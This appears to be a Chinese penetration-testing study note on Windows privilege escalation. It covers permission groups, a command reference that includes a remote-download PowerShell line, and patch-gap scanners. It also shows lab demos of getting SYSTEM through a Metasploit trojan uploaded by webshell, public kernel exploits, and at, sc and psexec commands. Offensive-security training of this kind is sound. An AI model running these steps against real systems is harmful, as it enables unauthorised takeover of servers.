<a name="FSkZd"></a>
# 一、思维导图
![](https://cdn.nlark.com/yuque/0/2022/webp/2476579/1647950811118-af25c58b-9538-4043-b42e-aa4fb83f38db.webp#clientId=u3166a205-9211-4&from=paste&id=ub6278989&originHeight=2051&originWidth=942&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u01bf52f2-9093-4c05-adcb-a3a5461fce0&title=)
```vue
明确权限提升基础知识：权限划分

明确权限提升环境问题：web及本地

web提权：已有网站权限（可以操作网站内容，但无法操作服务器），想要获得服务器权限，进而操作服务器。
本地提权：已有服务器普通用户权限，想要获得root权限。
明确权限提升方法针对：针对方法适应问题

明确权限提升针对版本：个人及服务器版本;针对方法；

知识点必备：

用户及用户组权限划分；Windows提权命令
```
<a name="yAvMC"></a>
# 二、权限认识
**windows权限认识(用户及用户组)**<br />Windows系统内置了许多本地用户组，这些用户组本身都已经被赋予一些权限（permissions),它们具有管理本地计算机或访问本地资源的权限。只要用户账户加入到这些本地组内，这些用户账户也将具备该组所拥有的权限。<br />**0x01 普通权限**<br />默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)，身份验证用户组(Ahthenticated users)。其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。<br />管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）。再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置，不能运行一些涉及系统管理的程序。普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行涉及管理的程序等。来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。 <br />**0x02特殊权限**<br />除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是:SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者) 等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。<br />真正拥有“完全访问权”的只有一个成员:SYSTEM。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的。<br />“所有人”权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件，这也是一些程序正常运行需要的访问权限——任何人都能正常访问被赋予“Everyone”权限的文件，包括来宾组成员。<br />被标记为“创建者”权限的文件只有建立文件的那个用户才能访问，做到了一定程度的隐私保护。<br />但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。<br />无论是普通权限还是特殊权限，它们都可以“叠加”使用，“叠加”就是指多个权限共同使用，例如一个账户原本属于Users组，而后我们把他加入Administrators组再加入Trustedinstaller等权限提升，那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定身份访问的场合，用户只有为自己设置了指定的身份才能访问，这个时候“叠加”的使用就能减轻一部分劳动量了。

参考：https://blog.csdn.net/qq_17204441/article/details/89063095
<a name="LJtyP"></a>
# 三、常见cmd命令
```vue
命令                          //描述
systeminfo  　　　　　　　　//打印系统信息
whoami      　　　　　　　　//获得当前用户名
whoami /priv    　　　　　　//当前账户权限
ipconfig        　　　　　  //网络配置信息
ipconfig /displaydns        //显示DNS缓存
route print                 //打印出路由表
arp -a                      //打印arp表
hostname                    //主机名
net user                    //列出用户
net user UserName           //关于用户的信息
net user \SMBPATH Pa$$w0rd /u:UserName      //连接SMB
net localgroup              //列出所有组
net localgroup GROUP        //关于指定组的信息
net view \127.0.0.1         //会话打开到当前计算机
net session                 //开发给其他机器
netsh firewall show config  //显示防火墙配置
DRIVERQUERY             　　//列出安装的驱动
tasklist /svc               //列出服务任务
net start                   //列出启动的服务
dir /s foo                  //在目录中搜索包含指定字符的项
dir /s foo == bar           //同上
sc query                    //列出所有服务
sc qc ServiceName           //找到指定服务的路径
shutdown /r /t 0            //立即重启
type file.txt               //打印出内容
icacls "C:\Example"         //列出权限
wmic qfe get Caption,Description,HotFixID,InstalledOn  //列出已安装的补丁
(New-Object System.Net.WebClient) .DownloadFile("http://host/file"."C:\LocalPath")　//利用ps远程下载文件到本地
accesschk.exe -qwsu "Group"         //修改对象（尝试Everyone，Authenticated Users和/或Users）
```
<a name="soaVv"></a>
# 四、案例演示
<a name="tYHDV"></a>
## **4-1阿里云靶机（Windows2012）**
知识点：

- 如何判断使用哪种溢出漏洞？漏洞哪里找？
- 信息收集-补丁筛选-利用MSF或特定EXP-执行-西瓜到手
- Vulmap，Wes，WindowsVulnScan对比，exp在哪里获取？
- MSF结合云服务器搭建组合拳？模拟上述操作实战演练？

**1、信息收集**<br />可以采用一些cmd命令，收集系统信息。比如

- whoami：获得当前用户名
- whoami /priv：当前账户权限
- systeminfo：查看系统打了哪些补丁
- net user：列出用户
- net user UserName：查看关于用户的信息
- net localgroup：列出所有组
- 等等

**2、补丁筛选**<br />Vulmap，Wes，WindowsVulnScan三种方法对比：

**vulmap:** 缺点需要在powershell环境中执行，而对于webshell中是没有权限的，更适配Linux系统。我在物理机和虚拟机中都要运行都出现了各种各样的问题。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1647954519280-3b2a6e96-543a-499d-a18e-7ae97e01dd91.png#clientId=u3166a205-9211-4&from=paste&height=315&id=u340a6bb5&originHeight=394&originWidth=828&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15063&status=done&style=none&taskId=ua05519d2-9670-4bf5-9987-bb0cfbda528&title=&width=662.4)<br />**wesng,** 优点能适应web环境只需要在webshell中执行cmd命令将信息导出到本地环境中执行即可<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1647955298881-0bfd25e8-f452-4f51-b5fd-df6a9c7d3348.png#clientId=u3166a205-9211-4&from=paste&height=460&id=u60f3deb7&originHeight=575&originWidth=1127&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66757&status=done&style=none&taskId=u9e74b2e8-3b80-40ce-aa86-b3edfb47d37&title=&width=901.6)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1647999715176-067e1986-ad8f-4955-bfd5-a98db469fb9e.png#clientId=u44d99d5a-4c3c-4&from=paste&height=533&id=u2ef0f7e5&originHeight=666&originWidth=940&originalType=binary&ratio=1&rotation=0&showTitle=false&size=114261&status=done&style=none&taskId=u34c44466-80b4-4b30-8e0d-9eec73ab3f7&title=&width=752)<br />**WindowsVulnScan：**[https://github.com/chroblert/WindowsVulnScan](https://github.com/chroblert/WindowsVulnScan)<br />**缺点：**需要借助powershll也可以用systeminfo获取的信息安装工具的格式改成为json
```vue
1. 首先运行powershell脚本KBCollect.ps收集一些信息

.\KBCollect.ps1
2. 将运行后产生的KB.json文件移动到cve-check.py所在的目录

3. 安装一些python3模块

python3 -m pip install requirements.txt
4. 运行cve-check.py -u创建CVEKB数据库

5. 运行cve-check.py -U更新CVEKB数据库中的hasPOC字段

此处可以使用-m选择更新模式。
-m All:更新所有
-m Empty:只更新hasPOC字段为空的
-m Error:只更新hasPOC字段为Error的
6. 运行cve-check.py -C -f KB.json查看具有公开EXP的CVE，如下：
```
![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648002430641-0dadc2d7-f5cd-48f3-8ac7-80ef2a28e513.png#clientId=u44d99d5a-4c3c-4&from=paste&id=u0949e1d2&originHeight=561&originWidth=1180&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u8bccfb37-19d8-4dcb-a366-2e0b3aa82aa&title=)<br />**3、利用MSF或特定EXP提权**<br />利用上述3种方法之一找出可利用的漏洞之后，我们可以利用msf或者特定exp进行测试。<br />首选msf工具，但是msf工具是隔一段时间更新一版，因此msf中的漏洞可能更新不及时，如果遇到了msf没有收录的漏洞，我们可以网上搜索特定的exp测试，比如GitHub上有人整理了很多exp，可以搜索一下。

- https://github.com/SecWiki/windows-kernel-exploits
- https://github.com/unamer/CVE-2018-8120

**MSF结合云服务器搭建组合拳？模拟上述操作实战演练？在实际环境中比较鸡肋因为涉及到阿里云的安全组端口开放问题**

- 若要在实战中使用msf，最好买台服务器，不需要配置太好，2核4G即可，linux操作系统（Ubuntu更兼容），只安装msf，使用时用xshell连接即可。
- 云服务器上安装MSF环境：[https://www.cnblogs.com/M0rta1s/p/11920903.html](https://www.cnblogs.com/M0rta1s/p/11920903.html)

msf提权演示案例：<br /><1>生成一个木马 exe文件<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003761171-0c87cd68-7e08-4b20-abe3-f2e0fd9779a8.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=u98c77873&originHeight=78&originWidth=638&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u3d8efcc2-5033-4f00-994e-87f7f46187e&title=)<br /><2>通过webshell上传这个test.exe文件到服务器（test.exe可能会被服务器上的waf识别，所以实战中需要免杀）<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003761103-6b821891-fb76-4f2c-a319-a4005c35e47e.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=u4f056425&originHeight=168&originWidth=488&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u8a5a48cd-8572-4aca-aa10-858062d15c6&title=)<br /><3>启动msf<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003761091-1f594d8b-c94c-43cd-8a51-967520c606a8.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=u892f7a95&originHeight=30&originWidth=313&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u418f4f23-ecd8-4650-a518-fa712e4bb7c&title=)<br /><4>msf监听5566端口<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003761270-aafe4d0f-1e8f-4981-a7ca-6fd1ea0f3a05.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=ucba41587&originHeight=171&originWidth=559&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u97500568-0d34-46ea-9d88-c022c94214f&title=)<br /><5>通过webshell执行这个test.exe文件<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003761096-f4541ca4-aec0-452e-a7fd-e1fd3c88efb1.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=uefb7f379&originHeight=247&originWidth=875&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u98cf0a03-61d5-4d4d-ac82-f77d902c188&title=)<br /><6>监听到会话，如上上图所示（注意：阿里云服务器安全组默认没有开5566端口，所以我们需要手动打开）<br /><7>查看，拿到服务器的web权限<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003761811-ba7a357a-c489-4fee-9458-72c30977366f.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=u90d56187&originHeight=40&originWidth=293&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u1ad849b4-65bb-4e2c-923b-3a498c93078&title=)<br /><8>接下来，我们需要进行web提权，搜索一个2016年的exp<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003761849-265ba69c-0c1b-4e99-be20-fea2618238e2.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=uf0603a33&originHeight=27&originWidth=247&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u3c750710-89a1-4e00-a320-55e6c4151a8&title=)<br /><9>使用这个exp<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003761897-ab5b8931-e81b-4feb-b111-32a265398436.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=uab9eb8bc&originHeight=32&originWidth=460&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u758f0c21-43c6-4308-a835-48f57e35f8b&title=)<br /><10>show options<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003761981-d3201c59-7d62-42eb-9c40-09fb6d3de785.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=u1788886d&originHeight=237&originWidth=522&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u67e6b356-f530-46c8-9ca6-d1e12c2cf60&title=)<br /><11>修改设置<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003761884-abe41ead-52f4-4020-8f1e-808975f3068b.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=u1254fbb7&originHeight=69&originWidth=590&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u81a7fbb4-a587-4167-8c8c-332dbd9a211&title=)<br /><12>重新show options，显示修改成功<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003762285-82306f33-bd21-446e-960c-f3090df253e2.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=u12925eb8&originHeight=249&originWidth=543&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u527079d8-8a2f-41cf-8392-293f0df0b99&title=)<br /><13>继续修改设置，利用，成功获取到system权限，提权成功。<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648003762342-286878be-285b-4215-a679-71b9c2f82971.jpeg#clientId=u44d99d5a-4c3c-4&from=paste&id=ub68fa391&originHeight=246&originWidth=607&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u46734d36-80fa-4a0e-b7c3-96c73080bcb&title=)
<a name="uavKw"></a>
## 4-2 本地靶机提权
利用CVE-2020-0787本地提权漏洞，在目标服务器执行BitsArbitraryFileMoveExploit.exe文件

- [https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1](https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1)

![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648121804637-03381e15-edd0-4e1e-a012-681bcfde959d.jpeg#clientId=u2c254a07-765d-4&from=paste&id=u36b2fb5c&originHeight=104&originWidth=577&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ud0c27cca-22d7-48c5-893f-c8f18388754&title=)<br /><3>弹出cmd窗口，运行whoami，发现已经取得了system权限<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648121804658-38963e6a-9228-480f-9145-e51ee3569926.jpeg#clientId=u2c254a07-765d-4&from=paste&id=ud3f9f124&originHeight=195&originWidth=704&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uc514934e-4816-41dc-a01b-3a3d1b85757&title=)
<a name="iCwx1"></a>
## 4-3 本地权限提升-AT&SC&PS命令
AT&SC&PS命令适用环境？-->AT&SC&PS提权在内网使用比较多
<a name="nt8bp"></a>
### 1、AT提权
相关命令：

| 1 | at 21:26 /interactive cmd.exe //给系统添加一项作业，在21:26打开cmd命令 |
| --- | --- |

at  //查看作业详情<br />at /del //删除作业<br />只针对win7之前的老系统，下面我们在windows2003系统上测试<br /><1>使用at命令给系统添加一项作业，在特定时间打开cmd命令<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648124564387-21d29bfd-e89f-492a-bf39-9453a65934e5.jpeg#clientId=u2c254a07-765d-4&from=paste&id=u733fd032&originHeight=111&originWidth=456&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u56d163ff-2f69-442d-abeb-ed7a60112d1&title=)<br /><2>等到特定时间时，系统会弹出cmd窗口，运行whoami，发现已经取得了system权限，提权成功。<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648124564320-4f4df101-b36a-4125-989a-01a78ca7ae05.jpeg#clientId=u2c254a07-765d-4&from=paste&id=u06629531&originHeight=130&originWidth=472&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u186a4f96-9fc3-4999-8d91-a276f6b1021&title=)<br />这是windows2003系统设计上的一个逻辑错误，就是计划任务在运行时会以system身份调用执行。所以弹出来的cmd窗口界面就会享有system权限。
<a name="Xsg7q"></a>
### 2、SC提权
相关命令：

| 1 | sc Create syscmd binPath = "cmd /k start" type= own type= interact |
| --- | --- |

sc start syscmd<br />网上说，可以针对win7/2k8，但是实操时并没成功。下面我们在windows2003系统上测试<br /><1>首先whoami查看用户身份为管理员<br /><2>使用sc命令创建一个服务，启动这个服务<br /><3>弹出cmd窗口，运行whoami，发现已经取得了system权限，提权成功。<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648124564351-040f0bb3-c2d6-4e61-81b2-85ba3b56fa8f.jpeg#clientId=u2c254a07-765d-4&from=paste&id=u38919fb7&originHeight=290&originWidth=506&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uac829c72-6ef4-4aab-ba65-4651dfa8032&title=)
<a name="ywvLm"></a>
### 3、PS提权
pstools是微软官方工具，是为windows提供的第三方工具库<br />下载地址：`https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools`<br />相关命令：

| 1 | psexec.exe -accepteula -s -i -d cmd.exe |
| --- | --- |

windows2008系统测试<br /><1>执行PS命令会弹出一个新的cmd窗口<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648124564341-723a6016-184b-40a8-b3f3-d5f7e8689aa7.jpeg#clientId=u2c254a07-765d-4&from=paste&id=u14c3fc54&originHeight=174&originWidth=530&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u63c716cc-2d10-4f90-8d67-8d9dabdc608&title=)<br /><2>运行whoami，发现已经取得了system权限，提权成功。<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/2476579/1648124564345-da50fe9f-07f8-405d-8c5d-225ba9b6029e.jpeg#clientId=u2c254a07-765d-4&from=paste&id=ucc2accb3&originHeight=120&originWidth=295&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ub34ea446-9f1b-468b-9427-e89b3d39fa7&title=)<br />win10访问失败<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648125075481-a2ad6f00-a925-4383-b7cd-f1b4a6f278de.png#clientId=u2c254a07-765d-4&from=paste&height=254&id=fav7E&originHeight=318&originWidth=1064&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29711&status=done&style=none&taskId=u4cbff864-9605-41e9-b451-15238e4bfdc&title=&width=851.2)<br />案例给到的思路总结如下：<br />1.提权方法有部分适用在不同环境，当然也有通用方法<br />2.提权方法也有操作系统版本区别，特性决定方法利用面<br />3.提权方法有部分需要特定环境，如数据库，第三方提权等

<a name="A05VZ"></a>
# 五、涉及资源
涉及资源：

Vulmap：[https://github.com/vulmon/Vulmap](https://github.com/vulmon/Vulmap)

wesng：[https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

CVE-2018-8120EXP：[https://github.com/unamer/CVE-2018-8120](https://github.com/unamer/CVE-2018-8120)

WindowsVulnScan：[https://github.com/chroblert/WindowsVulnScan](https://github.com/chroblert/WindowsVulnScan)

windows-kernel-exploits：[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) 作者：shtome [https://www.bilibili.com/read/cv14084565?spm_id_from=333.999.0.0](https://www.bilibili.com/read/cv14084565?spm_id_from=333.999.0.0) 出处：bilibili
